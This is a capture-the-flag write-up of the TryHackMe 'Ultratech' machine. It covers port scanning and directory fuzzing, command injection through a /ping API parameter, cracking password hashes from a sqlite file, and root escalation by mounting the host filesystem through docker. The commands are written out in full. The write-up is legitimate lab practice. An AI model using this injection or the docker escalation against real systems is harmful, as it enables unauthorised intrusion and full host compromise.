---
date: 2020-05-30 07:41:34
layout: post
title: "Ultratech"
subtitle: 
description: 
image: /writeup/assets/img/ultratech/ultratech.png
optimized_image:
category: tryhackme
tags: medium
author: cirius
paginate: false
---
<a href="https://tryhackme.com/room/ultratech1">Link</a> to the machine on tryhackme.

Starting with the nmap scan
```bash
nmap -T4 -p- -A 10.10.119.217
Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-09 22:56 IST
Nmap scan report for 10.10.119.217
Host is up (0.44s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.10 (92%), Linux 3.12 (92%), Linux 3.19 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops


TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   194.42 ms 10.8.0.1
2   195.05 ms 10.10.119.217

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.09 seconds
```

Since, there were 4 ports open.Started with the most interesting port that is 21. But anonymous login was not allowed.

Went on to the port 8081 and visited the website hosted at that port. The website was for api.
![placeholder](/writeup/assets/img/ultratech/api.png "api")

Nothing much found here so visted the port 31331 which had a website hosted.
![placeholder](/writeup/assets/img/ultratech/homepage.png "home")

Tried to find hidden directories and pages through ffuf.
```bash
ffuf -w wordlist -u http://10.10.119.217/FUZZ
```
![placeholder](/writeup/assets/img/ultratech/dir.png "dir")

The js directory had a api.js script.
```js
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
	return `${window.location.hostname}:8081`
    }
    
    function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
	    req.onload = function (e) {
		if (req.readyState === 4) {
		    if (req.status === 200) {
			console.log('The api seems to be running')
		    } else {
			console.error(req.statusText);
		    }
		}
	    };
	    req.onerror = function (e) {
		console.error(xhr.statusText);
	    };
	    req.send(null);
	}
	catch (e) {
	    console.error(e)
	    console.log('API Error');
	}
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
    
})();
```

The script showed two api auth and ping.ping can be used to run commands on the machine.

```bash
http://10.10.117.219/ping?ip=10.9.12.192 `whoami`
```
![placeholder](/writeup/assets/img/ultratech/rce.png "rce")

Running **ls** on the machine through the ap shows a file named **utech.db.sqlite**.
Listed contents of it with cat.

The file contained password hashes of two accounts; admin and r00t.

Cracked the hashes and logged in through the auth api as r00t.
```url
http://10.10.119.217:8081/auth?login=r00t&password=n******
```
![placeholder](/writeup/assets/img/ultratech/r00t.png "r00t")

Not much to be found.The creddentials for r00t also worked on ssh and gave the shell.

The r00t user was part of docker group.
```bash
id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

Through the command on GTFObins for docker, tried to get the root shell.
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

This failed as there was no image named alpine.

```bash
docker ps
```
This shows there is no image.
```docker ps -a
```
This shows that bash is present as image.

So ran
```bash
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

to get the root shell.
![placeholder](/writeup/assets/img/ultratech/root.png "root")

